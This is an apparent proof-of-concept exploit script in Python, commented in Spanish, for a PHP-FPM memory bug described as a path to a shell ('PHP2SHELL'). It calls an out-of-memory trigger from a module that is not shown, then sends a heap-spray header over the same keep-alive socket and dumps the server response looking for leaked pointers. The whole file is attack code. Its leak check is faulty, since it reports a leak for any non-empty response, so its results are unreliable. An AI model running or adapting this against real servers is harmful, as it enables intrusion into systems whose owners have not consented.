#!/usr/bin/env python3
"""
PHP2SHELL Research PoC - Heap Spraying & Info Leak Harness
Author: Research Lab / Academic Context
Target: Local PHP-FPM Engine (Persistent Worker / Keep-Alive)
"""

import socket
import ssl
from urllib.parse import urlparse

def perform_heap_spray_and_leak(target_url, active_socket):
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/'

    # Spray de datos controlados para ocupar el espacio liberado por el zval colgado
    spray_payload = b"CCCC" * 1024  # Patrón reconocible para identificar el solapamiento en el heap
    
    http_get_request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Connection: close\r\n"
        f"Cookie: PHPSESSID=research_session_01\r\n"
        f"X-Spray-Data: {spray_payload.decode('latin1')}\r\n\r\n"
    ).encode('latin1')

    print("[*] Reutilizando socket Keep-Alive para Heap Spraying e Info Leak...")
    try:
        active_socket.sendall(http_get_request)
        
        # Captura de la respuesta del servidor (donde se filtran fragmentos de memoria)
        response_data = bytearray()
        while True:
            chunk = active_socket.recv(4096)
            if not chunk:
                break
            response_data.extend(chunk)

        print(f"[+] Respuesta completa recibida ({len(response_data)} bytes).")
        
        # Análisis preliminar de posibles punteros filtrados en cabeceras o cuerpo
        if b"PHPSESSID" in response_data or len(response_data) > 0:
            print("[+] ¡Posible fuga de memoria detectada en el flujo de sesión!")
            # Volcado parcial de los primeros 512 bytes para inspección de punteros
            print(response_data[:512])
        else:
            print("[-] El worker terminó de forma limpia o cerró la conexión sin filtrar memoria.")

    except Exception as e:
        print(f"[-] Error durante la interacción con el socket: {e}")
    finally:
        active_socket.close()
        print("[*] Conexión cerrada.")

if __name__ == "__main__":
    import sys
    from trigger_oom import send_oom_trigger
    
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1/index.php"
    
    # 1. Disparamos el OOM inicial y obtenemos el socket vivo
    sock = send_oom_trigger(target)
    
    # 2. Ejecutamos el spray sobre el mismo worker afectado
    perform_heap_spray_and_leak(target, sock)
